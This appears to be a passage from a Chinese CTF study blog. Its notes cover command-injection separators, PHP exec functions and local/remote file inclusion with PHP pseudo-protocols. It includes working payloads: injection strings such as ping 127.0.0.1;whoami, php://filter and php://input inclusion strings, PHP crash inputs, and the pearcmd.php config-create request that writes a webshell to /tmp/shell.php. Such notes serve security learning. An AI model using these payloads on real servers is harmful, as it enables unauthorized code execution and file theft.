      <p>管道符    含义<br>；    执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami<br>|    显示后面语句的执行结果，例如：ping 127.0.0.1|whoami，会把前一个命令的结果作为参数传给后一个命令。<br>||    如果前面执行的语句执行报错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami<br>&amp;    不管前后命令是否执行成功都会执行前后命令    例如：ping 127.0.0.1&amp;whoami<br>&amp;&amp;    如果前面的语句为假，则直接报错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami</p>

        <h2 id="linux常用目录"   >
          <a href="#linux常用目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#linux常用目录" class="headerlink" title="linux常用目录:"></a>linux常用目录:</h2>
      <p>/ 表示系统根目录,任何时候都是</p>
<p>/etc/passwd 系统密码</p>
<p>/var/www/html/index.php  一般网站</p>
<div class="table-container"><table>
<thead>
<tr>
<th>换行符号</th>
<th>操作系统</th>
</tr>
</thead>
<tbody><tr>
<td>\n 10</td>
<td>Unix or Linux</td>
</tr>
<tr>
<td>\r\n 13 10(ascii)</td>
<td>Windows</td>
</tr>
</tbody></table></div>

        <h2 id="PHP命令执行函数"   >
          <a href="#PHP命令执行函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP命令执行函数" class="headerlink" title="PHP命令执行函数"></a>PHP命令执行函数</h2>
      
        <h3 id="1-system函数-最优先"   >
          <a href="#1-system函数-最优先" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-system函数-最优先" class="headerlink" title="1.system函数(最优先)"></a><strong>1.system函数(最优先)</strong></h3>
      <p>用于执行外部程序并显示输出</p>
<p>string system ( string $command [,int $return_var ])<br><?php system('whoami');?></p>
<p>执行后输出root</p>

        <h3 id="exec函数"   >
          <a href="#exec函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h3>
      <p>用于执行一个外部程序</p>
<p>string exec（string $command[,array &amp;$output[,ubt &amp;$return_var]]）</p>
<?php echo exec('whoami');?>

<p>执行时加上echo 才会输出whoami的结果root</p>

        <h3 id="shell-exec函数"   >
          <a href="#shell-exec函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3>
      <p>通过shell环境执行命令 且将完整的输出以字符串方式返回</p>
<p>string shell_exec(string $cmd)</p>
<?php echo shell_exec('whoami');?>

<p><strong>执行时加上echo</strong> 才会输出whoami的结果root</p>

        <h3 id="passthu函数-也优先"   >
          <a href="#passthu函数-也优先" class="heading-link"><i class="fas fa-link"></i></a><a href="#passthu函数-也优先" class="headerlink" title="passthu函数(也优先)"></a>passthu函数(也优先)</h3>
      <p>用于执行外部程序并显示原始输出</p>
<p>void passthru(string $command[,int &amp;$return_var])</p>
<?php passthru('whoami');?>

<p>执行后默认输出root</p>

        <h2 id="目录-文件操作"   >
          <a href="#目录-文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录-文件操作" class="headerlink" title="目录/文件操作"></a>目录/文件操作</h2>
      
        <h3 id="命令行操作"   >
          <a href="#命令行操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h3>
      
        <h4 id="目录操作"   >
          <a href="#目录操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4>
      <p>1.目录符号</p>
<p>. 或者./代表当前目录，</p>
<p>..  或者 ../代表上级目录 ../../上上级 以此类推</p>
<p>~ 代表用户的home目录</p>
<p>/ 代表系统根目录</p>
<p>2.ls      </p>
<p>ls         查看当前目录下的所有目录和文件</p>
<p>ls .. 查看上级目录所有文件</p>
<p>ls -a       查看当前目录下的所有目录和文件（包括隐藏的文件）</p>
<p>3.目录切换 cd</p>
<p>cd 目录 切换到目录</p>
<p>cd /     切换到根目录<br>cd /usr     切换到根目录下的usr目录<br>cd ..    (windows: ../)</p>
<p>4.pwd 查看当前文件目录绝对路径</p>
<p>5.cp 1.txt 2.txt 复制文件到当前目录</p>
<p>cp -r A  B           复制目录到当前目录 后者为新目录的名字</p>

        <h4 id="文件操作"   >
          <a href="#文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4>
      <p>文件的打开查看命令：</p>
<p>cat 文件名 : 输出这个文件的内容</p>
<p>cat /var/www/fl4gisisish3r3.php</p>
<p>查找某文件的绝对路径:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot; </span><br><span class="line">从/(根目录)查找文件名里有flag的文件(模糊查询)</span><br></pre></td></tr></table></div></figure>




        <h3 id="php操作"   >
          <a href="#php操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#php操作" class="headerlink" title="php操作"></a>php操作</h3>
      
        <h4 id="目录操作-1"   >
          <a href="#目录操作-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录操作-1" class="headerlink" title="目录操作"></a>目录操作</h4>
      <p>目录切换:</p>
<p>../表示源文件所在目录的上一级目录，../../表示源文件所在目录的上上级目录</p>
<p>查看目录:</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span> ; <span class="comment">// 取得当前文件的绝对地址，结果：D:\www\test.php</span></span><br><span class="line"><span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>); <span class="comment">// 取得当前文件所在的绝对目录，结果：D:\www\</span></span><br><span class="line"><span class="keyword">echo</span> dirname(dirname(<span class="keyword">__FILE__</span>)); <span class="comment">//取得当前文件的上一层目录名，结果：D:\</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="文件操作-1"   >
          <a href="#文件操作-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h4>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(<span class="string">&quot;文件名&quot;</span>);<span class="comment">//返回一个字符串</span></span><br><span class="line"><span class="comment">//文件名示例: </span></span><br><span class="line">同目录:flag.txt</span><br><span class="line">上级目录:../flag.txt</span><br><span class="line">真实路径:</span><br></pre></td></tr></table></div></figure>






        <h2 id="‘-‘和’-‘"   >
          <a href="#‘-‘和’-‘" class="heading-link"><i class="fas fa-link"></i></a><a href="#‘-‘和’-‘" class="headerlink" title="‘/‘和’\‘"></a>‘/‘和’\‘</h2>
      <p>/是斜杠, \是反斜杠</p>
<p>Windows采用\，如 C:\Windows(C盘Windows目录下)</p>
<p>Linux采用/，如/user/lib/file.txt（主分区的ROOT目录下）</p>
<p>网址也采用/, 如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer" >https://adworld.xctf.org.cn/task/answer</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>同时,’\‘也用作转义符</strong></p>
<p>所以我们会看到这样的路径:</p>
<p>C:\\folder1\\folder2\\folder3\\file.txt  (windos下的)</p>
<p>看到这样的网址：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:\/\/10.21.145.59\/FileImage\/test5\/d2\/1f722236d946fd98536ba805de31ed1ac2f4f8.jpg</span><br><span class="line">解析后：</span><br><span class="line">http://10.21.145.59/FileImage/test5/d2/1f722236d946fd98536ba805de31ed1ac2f4f8.jpg</span><br></pre></td></tr></table></div></figure>






        <h2 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h2>
      
        <h3 id="一、包含函数"   >
          <a href="#一、包含函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、包含函数" class="headerlink" title="一、包含函数"></a>一、包含函数</h3>
      <p>当利用这以下四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p>

        <h4 id="1、include-函数"   >
          <a href="#1、include-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、include-函数" class="headerlink" title="1、include()函数"></a>1、include()函数</h4>
      <p><strong>include()函数包含出错的话只会提出警告，但并不会影响后续语句的执行。</strong></p>

        <h4 id="2-require-函数"   >
          <a href="#2-require-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-require-函数" class="headerlink" title="2.require()函数"></a>2.require()函数</h4>
      <p><strong>require() 函数包含出错的话，则会直接退出，后续语句不在执行</strong></p>

        <h4 id="3-include-once-和require-once-函数"   >
          <a href="#3-include-once-和require-once-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-include-once-和require-once-函数" class="headerlink" title="3.include_once()和require_once()函数"></a>3.include_once()和require_once()函数</h4>
      <p><strong>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</strong></p>

        <h3 id="二-漏洞类型"   >
          <a href="#二-漏洞类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#二-漏洞类型" class="headerlink" title="二. 漏洞类型"></a>二. 漏洞类型</h3>
      
        <h4 id="allow-url-fopen和allow-url-include对文件包含的影响"   >
          <a href="#allow-url-fopen和allow-url-include对文件包含的影响" class="heading-link"><i class="fas fa-link"></i></a><a href="#allow-url-fopen和allow-url-include对文件包含的影响" class="headerlink" title="allow_url_fopen和allow_url_include对文件包含的影响"></a><strong>allow_url_fopen和allow_url_include对文件包含的影响</strong></h4>
      <p>allow_url_fopen  #允许url打开远程文件，如果url传入的参数是本地文件的不受此限制</p>
<p>当allow_url_fopen打开，allow_url_include关闭时</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/fi/?page=file1.php                             #可以使用</span><br><span class="line">/fi/?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=D:\phpstudy_pro\WWW\one.txt  #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=file:<span class="comment">//D:\phpstudy_pro\WWW\one.txt     #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=http:<span class="comment">//127.0.0.1/one.txt               #不可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=data:text/plain;base64,cXdlcmFhYQ==    #不可以使用</span><br><span class="line">/fi/?page=php:<span class="comment">//input                            #不可以使用</span></span><br></pre></td></tr></table></div></figure>

<p>当关闭了allow_url_open和allow_url_include时</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/fi/?page=file1.php                             #可以使用</span><br><span class="line">/fi/?page=file:<span class="comment">//D:\phpstudy_pro\WWW\one.txt     #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=D:\phpstudy_pro\WWW\one.txt  #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=http:<span class="comment">//127.0.0.1/one.txt               #不可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=data:text/plain;base64,cXdlcmFhYQ==    #不可以使用</span><br><span class="line">/fi/?page=php:<span class="comment">//input                            #不可以使用</span></span><br></pre></td></tr></table></div></figure>

<p>当allow_url_open关闭时，而allow_url_include开启的时候，只有php://input可以使用。php://input可以读取没有处理过的POST数据。php://input这个是不受allow_url_fopen影响。</p>

        <h4 id="1、LFI：本地文件包含漏洞"   >
          <a href="#1、LFI：本地文件包含漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、LFI：本地文件包含漏洞" class="headerlink" title="1、LFI：本地文件包含漏洞"></a>1、LFI：本地文件包含漏洞</h4>
      <p>LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。</p>
<p>同时借助此漏洞也可以查看服务器上的一些重要文件。</p>

        <h4 id="2、RFI：远程文件包含漏洞"   >
          <a href="#2、RFI：远程文件包含漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、RFI：远程文件包含漏洞" class="headerlink" title="2、RFI：远程文件包含漏洞"></a>2、RFI：远程文件包含漏洞</h4>
      <p>RFI(Remote File Inclusion) 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。</p>
<p>需要都打开allow_url_fopen = On  allow_url_include = On</p>

        <h3 id="三-伪协议"   >
          <a href="#三-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#三-伪协议" class="headerlink" title="三.伪协议"></a>三.伪协议</h3>
      <p>伪协议就是 伪协议的这段话在被包含时, 会执行协议内容</p>
<p>伪协议就是一个作用，就是你把它需要的东西输入进去，它就会实现响应的作用</p>
<p>data://text/plain,<?php print_r(scandir(/var/www));?></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen 默认为 On（本地）</span><br><span class="line">allow_url_include 默认为 Off（远程）</span><br></pre></td></tr></table></div></figure>

<p>协议</p>

        <h4 id="http"   >
          <a href="#http" class="heading-link"><i class="fas fa-link"></i></a><a href="#http" class="headerlink" title="http://"></a>http://</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>




        <h4 id="ftp"   >
          <a href="#ftp" class="heading-link"><i class="fas fa-link"></i></a><a href="#ftp" class="headerlink" title="ftp://"></a>ftp://</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>




        <h4 id="php-input"   >
          <a href="#php-input" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>




        <h4 id="data"   >
          <a href="#data" class="heading-link"><i class="fas fa-link"></i></a><a href="#data" class="headerlink" title="data://"></a>data://</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>




        <h4 id="allow-url-include不需要ON"   >
          <a href="#allow-url-include不需要ON" class="heading-link"><i class="fas fa-link"></i></a><a href="#allow-url-include不需要ON" class="headerlink" title="allow_url_include不需要ON"></a>allow_url_include不需要ON</h4>
      
        <h4 id="php-filter"   >
          <a href="#php-filter" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=Off/Onpld：?file=以base64读取：php://filter/read=convert.base64-encode/resource=index.php写入的时候，也需要include为open以base64写入：=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php（    &lt;?php phpinfo();?&gt;    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）</span><br></pre></td></tr></table></div></figure>




        <h4 id="file"   >
          <a href="#file" class="heading-link"><i class="fas fa-link"></i></a><a href="#file" class="headerlink" title="file://"></a>file://</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=Off/On</span><br></pre></td></tr></table></div></figure>




        <h4 id="phar"   >
          <a href="#phar" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=Off/On</span><br></pre></td></tr></table></div></figure>






        <h4 id="常用payload"   >
          <a href="#常用payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.?file=data:text/plain,&lt;?php phpinfo()?&gt;2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=3.?file=php://input [POST DATA:]&lt;?php phpinfo()?&gt;4.?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></div></figure>




        <h2 id="临时文件包含"   >
          <a href="#临时文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x01" >https://tttang.com/archive/1312/#toc_0x01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="原理"   >
          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h3>
      <p>我们对任意一个PHP文件发送一个上传的数据包时，<strong>不管这个PHP服务后端是否有处理<code>$_FILES</code>的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中</strong>，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉。</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/728ac837-fd5a-4ecc-abbb-2294784374e1.png" alt="image-20211012074128955.png"></p>
<p>在从“PHP writes data to temp file”到“php removes temp files(if any)”这两个操作之间的这段时间，我们可以包含这个临时文件，最后完成getshell操作。但这里面暗藏了一个大坑就是，<strong>临时文件的文件名我们是不知道的</strong>。</p>

        <h3 id="1-session-upload-progress与Session文件包含"   >
          <a href="#1-session-upload-progress与Session文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-session-upload-progress与Session文件包含" class="headerlink" title="1.session.upload_progress与Session文件包含"></a>1.session.upload_progress与Session文件包含</h3>
      <p>详见LFI_to_RCE复现</p>
<p>​    上述的两个方法，其实都没有解决本篇文章遇到的问题，毕竟Docker环境即不存在phpinfo也不存在Windows特性。</p>
<p>​    第三个方法也已经广为流传，PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件：</p>
<ul>
<li><strong>目标环境开启了<code>session.upload_progress.enable</code>选项</strong></li>
<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li>
<li>请求的Cookie中包含Session ID（启用了session）</li>
</ul>
<p>这个方法的原理是，PHP在开启了<code>session.upload_progress.enable</code>后（在包括Docker的大部分环境下默认是开启的），将会把用户<strong>上传文件的信息</strong>保存在Session中，<strong>而PHP的Session默认是保存在文件里的</strong>。</p>
<p>所以当攻击者发送满足上述条件的数据包时，就等于能够控制<strong>Session文件内容。</strong></p>
<p>但是PHP中还有另外一个配置项<code>session.upload_progress.cleanup</code>，默认开启。在这个选项开启时，PHP会在<strong>上传请求被读取完成后自动清理掉这个Session</strong>，</p>
<p>所以，默认情况下，我们需要在Session文件被清理前利用它，这也会用到条件竞争（Race Condition），也就是需要多线程来并发执行，力求在/tmp/sess_PHPSESSID被清除之前，就能执行文件包含，执行我们的木马php命令。</p>

        <h3 id="2-Segfault遗留下TEMP文件"   >
          <a href="#2-Segfault遗留下TEMP文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Segfault遗留下TEMP文件" class="headerlink" title="2.[Segfault遗留下TEMP文件]"></a>2.[Segfault遗留下TEMP文件]</h3>
      <p><strong>！这个Bug在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/791f07e4f06a943bd7892bdc539a7313fb3d6d1e" >7.1.20</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>以后被修复，也没有留下更新日志，我们可以使用7.1.19版本的PHP进行尝试。</strong></p>
<p>那么，如果关闭了<code>session.upload_progress.enable</code>，是否还有其他利用方法呢？</p>
<p>我们的目的是在服务器上留下一个内容可控的文件，最简单的方法就是利用上传包的临时文件。但这个临时文件之所以不能直接利用，原因有两点：</p>
<ul>
<li>临时文件名是随机的</li>
<li>临时文件在请求结束后会被删除</li>
</ul>
<p>如果说第一点我们可以通过爆破来解决，那么第二点是一定无法同时解决的——我们不可能在请求结束前爆破出临时文件名。</p>
<p>经过上面的分析，我们很容易想到一种解决方案：<strong>如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了</strong>。</p>
<p>PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。</p>
<p>国内的安全研究者<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258" >@王一航</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 曾发现过一个会导致PHP crash的方法：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258" >https://www.jianshu.com/p/dfd049924258</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;php://filter/string.strip_tags/resource=/etc/passwd&#x27;;</span><br></pre></td></tr></table></div></figure>

<p><code>php://filter</code>中另一个可以导致crash的方法，测试代码是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpfile(urldecode(&#x27;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&#x27;));</span><br></pre></td></tr></table></div></figure>

<p>不过这个crash涉及到<code>data:</code>协议，会因为<code>allow_url_include=Off</code>而失败。</p>

        <h3 id="3-pear-pecl、"   >
          <a href="#3-pear-pecl、" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-pear-pecl、" class="headerlink" title="3.pear/pecl、"></a>3.pear/pecl、</h3>
      
        <h4 id="什么东西"   >
          <a href="#什么东西" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么东西" class="headerlink" title="什么东西"></a>什么东西</h4>
      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205431.png" alt="image-20211115215142909"></p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。</p>
<p>pecl/pear中有一个文件 pearcmd.php。</p>

        <h4 id="利用条件"   >
          <a href="#利用条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4>
      <p>在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<p>原本它只是一个命令行工具，不在web目录下面，但是我们现在能文件包含，我们可包含到pear中，利用它的命令来做事。</p>

        <h4 id="利用方法"   >
          <a href="#利用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4>
      
        <h5 id="1-config-create"   >
          <a href="#1-config-create" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-config-create" class="headerlink" title="1.config-create"></a><strong>1.config-create</strong></h5>
      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205433.png" alt="image-20211115215513426"></p>
<p>利用它的一个命令，config-create来创建一个文件，它有两个参数，第一个参数是文件内容，第二个参数是写入的路径。</p>

        <h5 id="2-SERVER-‘argv’"   >
          <a href="#2-SERVER-‘argv’" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SERVER-‘argv’" class="headerlink" title="2.$_SERVER[‘argv’]"></a><strong>2.$_SERVER[‘argv’]</strong></h5>
      <p>​    发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。他们都是全局变量，为传递给脚本的参数数组——</p>
<p>$argc — 传递给脚本的参数数目</p>
<p>$argv — 传递给脚本的参数数组</p>
<p>而$_SERVER[‘argv’]这个参数是我们可以利用的，argv是命令行参数，RFC3875中规定，如果query-string中不包含<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。<strong>也就是说，如果我们传递的参数没有键（参数名），那这个参数就会变成命令行参数argv。</strong></p>
<p>（query-string是指我们在url中传的参数）<img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
<p>而pear又会去命令行中获取argv：</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205434.png" alt="image-20211116005524798"></p>
<p>所以，这就很巧了，我们传入命令行参数argv，再包含pearcmd.php来运行它，也就是运行我们传入的命令，结合它的 config-create 命令创建shell文件。</p>

        <h5 id="3-payload"   >
          <a href="#3-payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h5>
      <p>最后，得到的payload如下：（p神的）</p>
<p>/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php    </p>
<p>这里的+号是空格的意思，是空格被编码变成了+号，所以最后的命令行参数就是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create //&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>

<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/shell.php</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></div></figure>

<p>我自己又尝试了一下，我发现去掉<?=phpinfo()?>前面的/也可以运行：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&amp;<span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php三个参数:	file=/usr/local/lib/php/pearcmd.php    +config-create+/    <span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create /&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>

<p>但是config-create / 里的/不能去掉，它应该代表的是根目录的意思，应该是一个固定的参数：</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205435.png" alt="image-20211116010232266"></p>
<p>最后，shell被写到了/tmp/shell.php下，成功获取</p>

        <h1 id="常用文件包含路径"   >
          <a href="#常用文件包含路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用文件包含路径" class="headerlink" title="常用文件包含路径"></a>常用文件包含路径</h1>
      <p>/etc/issue 版本</p>
<p>/etc/passwd 密码</p>
<p>/var/log/apache2/access.log 日志</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/16/LFI-to-RCE/">LFI_to_RCE</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-11-16</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-11-16</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="笨比"   >
          <a href="#笨比" class="heading-link"><i class="fas fa-link"></i></a><a href="#笨比" class="headerlink" title="笨比"></a>笨比</h1>
